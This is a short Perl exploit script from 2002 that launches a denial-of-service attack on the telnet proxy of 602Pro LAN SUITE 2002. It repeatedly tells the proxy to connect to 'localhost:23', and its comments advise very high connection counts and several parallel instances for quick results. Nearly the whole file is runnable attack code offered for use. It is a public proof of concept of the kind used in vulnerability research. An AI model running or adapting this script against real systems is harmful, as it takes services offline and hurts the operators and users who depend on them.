#!/usr/bin/perl

#

# lansuite-proxy-DoS.pl - 602Pro LAN SUITE 2002 telnet proxy DoS

#

# Note: Try very high number of connections and run multiple instances

# of the script for quick results.

#

# Date: August 3, 2002

# Author: Stan Bubrouski (stan@ccs.neu.edu)



if (!$ARGV[2]) {

        print "Usage $0 <hostname> <port> <connections>\n\n";

        exit();

}


$host = $ARGV[0];

$port = $ARGV[1];

$numc = $ARGV[2];



use Net::Telnet ();

$t = new Net::Telnet;

$t->open(Host => $host,Port => $port);

foreach(1...$numc) {

        $t->waitfor('/.*host.*/');

        $t->print('localhost:23');

}

